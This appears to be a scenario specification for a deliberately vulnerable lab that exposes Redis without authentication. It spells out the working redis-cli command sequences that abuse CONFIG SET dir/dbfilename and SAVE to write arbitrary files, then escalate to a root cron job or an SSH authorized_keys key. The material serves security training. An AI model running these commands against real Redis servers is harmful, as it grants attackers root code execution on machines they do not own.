---
id: redis_rce
description: Configures an unauthenticated, network-exposed Redis instance whose RDB persistence is abused for arbitrary file write (CONFIG SET dir/dbfilename + SET payload + SAVE), enabling Remote Code Execution by writing a root cron job or an SSH authorized_keys file.
required_vars: []
requires_service: redis
---
# Atom: Redis RCE via RDB File Write (CONFIG SET dir)
An unauthenticated Redis server that any host on the network can reach is a remote
code-execution primitive. Redis lets a connected client relocate its RDB snapshot
with `CONFIG SET dir <path>` and `CONFIG SET dbfilename <name>`, then dump an
attacker-chosen key value to that path with `SAVE`. Because the dumped value is
written verbatim into the file, the attacker controls a file's contents at an
arbitrary path, which is escalated to code execution by overwriting a cron file
(`/var/spool/cron/...`) or an SSH `authorized_keys` file.

> **Redis is provided by the platform.** The `redis` service recipe (declared via
> `requires_service`) installs the correct package for the target distro (apt on
> Debian, dnf on Rocky/RHEL), writes `/etc/redis/redis.conf`, binds `0.0.0.0`, turns
> protected-mode off, and starts the daemon. The entity script MUST NOT install,
> configure, or daemonize Redis itself — no package-manager commands, no
> `redis-server ... --daemonize`. This atom only asserts the unauthenticated-exposure
> posture and leaves the server usable for the file-write primitive below.

### CRITICAL — the only technique that works (do NOT use the Lua sandbox):
Redis achieves this file-write **through its own `CONFIG SET` / `SAVE` commands**,
issued directly with `redis-cli`. It does **NOT** go through Lua scripting:

- **DO NOT** attempt RCE via `EVAL "... os.execute(...) ..."`, `io.popen`,
  `system.call`, or any Lua shell-out. Redis strips the `os`, `io`, and `system`
  libraries from its scripting sandbox on **every** version — `os` resolves to
  `nonexistent global variable 'os'` and `system.call` is an `Unknown Redis command`.
  Those are non-vulnerabilities that can never solve on any distro. Do not premise
  the scenario on them.
- **DO NOT** wrap `CONFIG SET` / `SAVE` inside `EVAL "redis.call('CONFIG','SET',...)"`.
  Redis forbids `CONFIG`, `SAVE`, and other admin commands *from scripts* on every
  version ("This Redis command is not allowed from script"). Issue them as **direct**
  `redis-cli CONFIG SET ...` / `redis-cli SAVE` commands, which always succeed on an
  unauthenticated server.

### Logic Requirements:
1. Redis MUST be reachable unauthenticated on all interfaces: `bind 0.0.0.0`,
   `protected-mode no`, and no `requirepass`. (The recipe already writes this — the
   entity verifies it rather than re-installing Redis.)
2. The file-write primitive MUST use the direct command sequence, not Lua:
   - `CONFIG SET dir <writable directory>`
   - `CONFIG SET dbfilename <filename>`
   - `SET <key> "<file contents>"`
   - `SAVE` (writes `<dir>/<dbfilename>` with the key value embedded in the RDB).
3. To reach code execution, the written file MUST be a location the OS acts on:
   - **Cron:** `dir` = the distro cron spool, `dbfilename` = `root`, value = a crontab
     line padded with leading/trailing newlines so the surrounding RDB bytes are
     ignored as blank cron lines. The spool path is distro-specific
     (`/var/spool/cron` on RHEL/Rocky, `/var/spool/cron/crontabs` on Debian/Ubuntu) —
     resolve it, do not hardcode one.
   - **SSH:** `dir` = `/root/.ssh`, `dbfilename` = `authorized_keys`, value = an SSH
     public key padded with newlines.
   (Both escalation paths require the Redis process to run with enough privilege to
   write the target — true when the platform starts it as root.)

### Common Patterns:
- **Arbitrary file write (the core primitive, distro-agnostic):**
  ```bash
  REDIS="redis-cli -h 127.0.0.1"
  $REDIS CONFIG SET dir /tmp
  $REDIS CONFIG SET dbfilename exploit.rdb
  $REDIS SET pwn "pwned-by-redis-rce"
  $REDIS SAVE            # writes /tmp/exploit.rdb containing the value "pwned-by-redis-rce"
  ```
- **Escalate to a root cron job (resolve the spool dir per distro):**
  ```bash
  CRON_DIR=/var/spool/cron
  [ -d /var/spool/cron/crontabs ] && CRON_DIR=/var/spool/cron/crontabs   # Debian/Ubuntu
  redis-cli -h 127.0.0.1 CONFIG SET dir "$CRON_DIR"
  redis-cli -h 127.0.0.1 CONFIG SET dbfilename root
  redis-cli -h 127.0.0.1 SET pwn $'\n\n*/1 * * * * id > /tmp/redis_cron_proof 2>&1\n\n'
  redis-cli -h 127.0.0.1 SAVE
  ```
- **Escalate via SSH authorized_keys:**
  ```bash
  redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh
  redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys
  redis-cli -h 127.0.0.1 SET pwn $'\n\nssh-ed25519 AAAA... attacker@box\n\n'
  redis-cli -h 127.0.0.1 SAVE
  ```

### Testing Guidance:
1. Verify Redis is listening on `0.0.0.0`: `ss -tlnp | grep 6379`.
2. Confirm unauthenticated access: `redis-cli -h 127.0.0.1 ping` returns `PONG` with
   no credentials.
3. Prove the arbitrary file-write primitive (robust across distros and regardless of
   which user Redis runs as — write into `/tmp`):
   ```bash
   redis-cli -h 127.0.0.1 CONFIG SET dir /tmp
   redis-cli -h 127.0.0.1 CONFIG SET dbfilename exploit.rdb
   redis-cli -h 127.0.0.1 SET pwn "pwned-by-redis-rce"
   redis-cli -h 127.0.0.1 SAVE
   test -f /tmp/exploit.rdb && grep -q 'pwned-by-redis-rce' /tmp/exploit.rdb
   ```
   The file MUST exist and contain the injected value — this is the exact
   `verify_rdb_file_exists` step the scenario hinges on.
4. From the attacker host (cross-container), the same sequence against
   `redis-cli -h <target_ip>` MUST succeed, since no authentication is required.

### Synthesis Guidance:
Redis install/start/`bind 0.0.0.0`/`protected-mode no` is owned by the `redis` recipe —
the entity must not duplicate or re-run it. The vulnerability is the **unauthenticated
exposure plus the RDB file-write primitive**, exercised with direct `redis-cli`
`CONFIG SET` / `SET` / `SAVE` commands. Never route the primitive through the Lua
sandbox: `os`/`io`/`system` are stripped on every Redis version, and `CONFIG`/`SAVE`
are rejected inside `EVAL` scripts — both are dead ends that make the scenario
unsolvable. Keep `CONFIG SET dir`/`dbfilename` as plain commands; if any `CONFIG SET`
is emitted wrapped in a trivial `EVAL "redis.call('CONFIG',...)"`, the build-time Redis
Lua sanitizer flattens it to the direct form, but the atom should prescribe the direct
commands from the start. Resolve the cron spool directory at runtime rather than
hardcoding a single distro's path.
